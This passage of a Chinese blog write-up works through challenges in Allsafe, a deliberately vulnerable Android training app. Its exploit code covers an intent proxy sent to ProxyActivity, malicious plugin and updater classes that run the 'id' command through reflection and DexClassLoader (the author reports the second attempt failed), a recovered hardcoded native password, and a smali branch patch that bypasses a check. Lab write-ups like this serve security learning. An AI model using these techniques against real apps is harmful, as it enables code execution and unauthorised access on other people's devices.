class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(Intent._ACTION_VIEW_);<br>        readIntent.setDataAndType(targetUri, <span class="hljs-string">&quot;text/plain&quot;</span>);<br>        readIntent.setFlags(Intent._FLAG_GRANT_READ_URI_PERMISSION_);<br><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">proxyIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>        proxyIntent.setComponent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(<br>                <span class="hljs-string">&quot;infosecadventures.allsafe&quot;</span>,<br>                <span class="hljs-string">&quot;infosecadventures.allsafe.ProxyActivity&quot;</span><br>        ));<br>        proxyIntent.putExtra(<span class="hljs-string">&quot;extra_intent&quot;</span>, readIntent);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            startActivity(proxyIntent);<br>            Log._d_(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Proxy intent sent!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Failed to launch intent: &quot;</span> + e.getMessage());<br>        &#125;<br><br>        finish();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>（不知道为什么 readme 没有下载下来，所以只好自己创建一个作为演示）</p>
+<p><img src="/img/NYRybgeRKog6omxBCLuctQVCnhc.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Arbitrary-Code-Execution"><a href="#Arbitrary-Code-Execution" class="headerlink" title="Arbitrary Code Execution"></a>Arbitrary Code Execution</h1><p>会同时调用 <code>invokePlugins</code> 和 <code>invokeUpdate</code> 方法</p>
+<ol>
+<li><strong>任意代码执行漏洞 (invokePlugins 方法)</strong></li>
+</ol>
+<ul>
+<li>遍历所有包名以 <code>infosecadventures.allsafe</code> 开头的已安装应用</li>
+<li>通过反射加载并执行任意插件类：<code>infosecadventures.allsafe.plugin.Loader.loadPlugin()</code></li>
+</ul>
+<ol start="2">
+<li><strong>DexClassLoader 远程代码执行漏洞 (invokeUpdate 方法)</strong></li>
+</ol>
+<ul>
+<li>从 SD 卡加载 <code>/sdcard/Download/allsafe_updater.apk</code></li>
+<li>使用 DexClassLoader 动态加载 DEX 文件</li>
+<li>执行其中的 <code>infosecadventures.allsafe.updater.VersionCheck.getLatestVersion()</code> 方法</li>
+</ul>
+<p><img src="/img/KiJPbWUo7o1iflx4NgKcD6fenJ6.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于 <code>invokePlugins</code>，只需要创建一个以 <code>infosecadventures.allsafe</code> 开头的 app，然后定义 <code>infosecadventures.allsafe.plugin.Loader</code> 类和 <code>loadPlugin</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.plugin;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Loader</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> String _TAG _= <span class="hljs-string">&quot;PluginLoader&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadPlugin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime._getRuntime_().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine(); <br>            Log._d_(_TAG_, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(_TAG_, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">adb shell <span class="hljs-string">&quot;logcat | grep Command&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/WEI3b0IAioGoBOx9ldMceTrmnmh.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于 <code>invokeUpdate</code>，读取 <code>/sdcard/Download/</code> 下的 <code>allsafe_updater.apk</code>，然后调用了 <code>infosecadventures.allsafe.updater.VersionCheck</code> 类的 <code>getLatestVersion</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.updater;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionCheck</span> &#123;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">getLatestVersion</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime._getRuntime_().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine();<br>            Log._d_(_TAG_, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(_TAG_, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是命令并没有被执行，我 hook 了 <code>DexClassLoader</code> 的执行过程，发现报错了</p>
+<p><img src="/img/X5pxbJq4JoaZMOxgrNPc08jBnFe.png" srcset="/img/loading.gif" lazyload></p>
+<p>回头看看代码，发现他期望函数调用后返回一个 int 数值</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">**int** version = ((Integer) objInvoke).intValue();<br></code></pre></td></tr></table></figure>
+
+<p>改了一下返回类型</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.updater;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionCheck</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;VersionCheck&quot;</span>;<br>    <br>    <span class="hljs-keyword">public</span> img <span class="hljs-type">int</span> <span class="hljs-title function_">getLatestVersion</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine();<br>            Log.d(TAG, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">999</span>;  <br>            <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">999</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现还是不行，hook 了一些 file 对象，路径应该就是 <code>/sdcard/Downloadall/safe_updater.apk</code>，frida 没有权限主动加载这个 apk，allsafe 也没有执行成果（T T 还是太菜了 ）</p>
+<h1 id="Native-Library"><a href="#Native-Library" class="headerlink" title="Native Library"></a>Native Library</h1><p><code>checkPassword</code> 是一个 native 方法</p>
+<p><img src="/img/NxDfbByLzo508IxpIdqcuDMNnRV.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到 JNI 方法 <code>checkPassword</code></p>
+<p><img src="/img/M9hibfq29oVBBtxiTLjczJN0nob.png" srcset="/img/loading.gif" lazyload></p>
+<p>一路追踪找到硬编码的密码 <code>supersecret</code></p>
+<p><img src="/img/UjyxbEICxooMkqxFapzc5mnQnVb.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/SauDbppqboa04AxbkubcFE3bnOf.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Smali-Patch"><a href="#Smali-Patch" class="headerlink" title="Smali Patch"></a><strong>Smali Patch</strong></h1><p>这个 if 判断 active 是否等于 inactive 永远为假，能做的方法有很多</p>
+<p>题目希望用 <code>Patch Smali字节码</code> 的方式来绕过判断</p>
+<p><img src="/img/LsM4b9kQ1o84dRx44iHc0MOfnMg.png" srcset="/img/loading.gif" lazyload></p>
+<p>if-eqz 是判断相等，只需把 <strong>if-eqz</strong> 改成 <strong>if-nez</strong><strong>(不相等)即可</strong></p>
+<p><img src="/img/HldgbdQ2mocdW0xR4lKcrlnDnbe.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Eig4bOq4gotGwqxF7x3cEGsSnnh.png" srcset="/img/loading.gif" lazyload></p>
+<p>patch 完后重新安装，就可以绕过了</p>
+<p><img src="/img/DqnZb7gh8opIXHx31WvcwnHin5k.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h2 id="📄-许可证"><a href="#📄-许可证" class="headerlink" title="📄 许可证"></a>📄 许可证</h2><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International (CC BY 4.0)</a> 许可证。</p>
+<p>这意味着你可以自由地：</p>
+<ul>
+<li><strong>分享</strong> — 以任何媒介或格式复制及分发本材料</li>
+<li><strong>改编</strong> — 重混、转换和基于本材料创作，适用于任何目的，包括商业用途</li>
+</ul>
+<p>在以下条件下：</p>
+<ul>
+<li><strong>署名</strong> — 你必须给出适当的署名，提供指向本许可证的链接，同时标明是否作出了修改</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>allsafe WP</div>
+      <div>http://example.com/2025/12/18/allsafe-WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Gilgamesh</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/07/frida-labs-WP/" title="frida-labs WP">
+                        <span class="hidden-mobile">frida-labs WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
